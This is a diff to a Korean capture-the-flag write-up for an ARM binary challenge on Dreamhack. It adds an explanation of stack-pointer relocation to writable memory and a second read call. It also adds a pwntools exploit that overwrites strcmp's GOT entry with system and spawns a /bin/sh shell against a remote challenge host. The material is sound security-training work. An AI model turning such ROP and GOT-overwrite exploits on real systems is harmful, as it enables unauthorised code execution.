@@ -150,11 +150,37 @@ sp는 0x21037에 위치하고, 000107fc  ldmia sp!,{r11 ,pc} 에서는 fp와 리
 5. 0x21010(strcmp got)에 system 주소, 0x21038에 fp주소, r0="bin/sh"을 세팅하는 가젯과 strcmp 호출을 위한 0x1074c 주소 덮어쓰기
 
 
- ## 코드
+## 오류 해결
 
- 
+그런데 이렇게만 하면 segmentation fault 오류가 발생한다.  
+이유는 쓰기 권한이 없는 영역에 쓰기 동작을 하고 있기 때문이다.
+따라서 sp 값을 쓰기 권한이 있으면서, 좀더 큰 값으로 할당해줘야 한다.
 
 
+### sp 값 다시 세팅
+
+<img width="561" height="242" alt="image" src="https://github.com/user-attachments/assets/487fe7d0-b1ab-4d6a-b523-a3fa4d7199f0" />
+
+다시 main 함수의 가젯을 확인하면서 수정한다.
+
+* sp가 가리키는 곳이 0x21800이 되도록 해야 하는데, 현재는 read의 길이 제한(0xff) 때문에 네 조작 후 곧바로 원하는 값을 덮어쓰기 어렵다.
+* 0x21800에 값을 쓰기 위해서는  read를**다시 호출**해야 한다.
+* 이때 read의 GOT에 read의 주소를 적어 read가 정상 동작하도록 한다.
+
+* **r1 조작**
+    * 두 번째 read 실행 시 버퍼에 해당하는 r1을 조작해야 한다.
+    * 0x107e4의 cpy r1, r3 에 r3를 복사하는 가젯을 사용해 조작할 수 있다.
+
+* **최종 목표 및 가젯**
+    * read를 다시 실행해 0x21800에 원하는 값을 적는다
+    * 이후 sp 값 또한 0x21800으로 조작한다.
+    * 0x21800에 최종적으로 적어야 하는 값은 **r0를 `"/bin/sh"` 주소로 세팅하고 system의 strcmp를 호출하는 역할**을 하는 가젯이다.
+
+
+ ## 최종 익스플로잇 코드
+
+
+```python
 from pwn import *
 
 def slog(n, m): return success(' : '.join([n, hex(m)]))
@@ -164,7 +190,7 @@ isRemote = False
 isDebug = False
 
 if isRemote:
-    p = remote('host3.dreamhack.games', 0000)
+    p = remote('host8.dreamhack.games', 19263)
 else:
     if isDebug:
         p = process(['qemu-arm-static', '-g', '54321', './arm_training-last'])
@@ -217,6 +243,7 @@ payload += p32(0x1074c)
 p.send(payload)
 
 p.interactive()
+```
 
-
+<img width="973" height="150" alt="image" src="https://github.com/user-attachments/assets/4a531ba0-507b-42c6-bde9-0f9e34a66153" />
 
